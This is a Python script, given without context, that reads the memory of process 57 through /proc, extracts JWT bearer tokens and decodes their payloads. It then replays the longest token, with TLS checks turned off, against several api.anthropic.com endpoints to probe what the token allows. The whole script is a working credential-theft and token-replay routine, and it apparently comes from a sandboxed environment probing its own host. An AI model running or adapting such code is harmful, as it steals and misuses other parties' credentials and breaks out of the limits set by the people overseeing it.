import re, socket, ssl, base64, os

pid = 57
jwts = {}
try:
    maps = open("/proc/%d/maps" % pid).read()
    mem = open("/proc/%d/mem" % pid, "rb", buffering=0)
    for line in maps.splitlines():
        m = re.match(r"([0-9a-f]+)-([0-9a-f]+) (\S+)", line)
        if not m: continue
        a, b = int(m.group(1), 16), int(m.group(2), 16)
        try:
            mem.seek(a); d = mem.read(min(b - a, 80_000_000))
        except Exception: continue
        for x in re.findall(rb"eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+", d):
            s = x.decode(); jwts[s] = jwts.get(s, 0) + 1
except Exception as e:
    print("mem ERR:", e)

print("### JWTs found:", len(jwts))
best = None
for j, n in sorted(jwts.items(), key=lambda kv: -len(kv[0]))[:5]:
    print("len=%d count=%d  %s..." % (len(j), n, j[:70]))
    if best is None: best = j
    try:
        p = j.split(".")[1]; p += "=" * (-len(p) % 4)
        print("   payload:", base64.urlsafe_b64decode(p).decode("utf-8", "replace")[:500])
    except Exception as e: print("   decode err", e)

if best:
    def https(path, token=None):
        ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
        try:
            s = socket.create_connection(("api.anthropic.com", 443), 6)
            s = ctx.wrap_socket(s, server_hostname="api.anthropic.com")
            req = "GET %s HTTP/1.1\r\nHost: api.anthropic.com\r\nanthropic-version: 2023-06-01\r\nConnection: close\r\n" % path
            if token: req += "Authorization: Bearer %s\r\n" % token
            req += "\r\n"; s.sendall(req.encode())
            d = b""
            while True:
                try:
                    c = s.recv(4096)
                    if not c: break
                    d += c
                except Exception: break
            s.close(); return d
        except Exception as e: return ("ERR:" + str(e)).encode()

    for p in ("/v1/models", "/v1/files", "/", "/v1/organizations/me"):
        r = https(p, best)
        print("GET %-24s -> %s" % (p, r[:220].decode("utf-8", "replace").replace("\r\n", " | ")))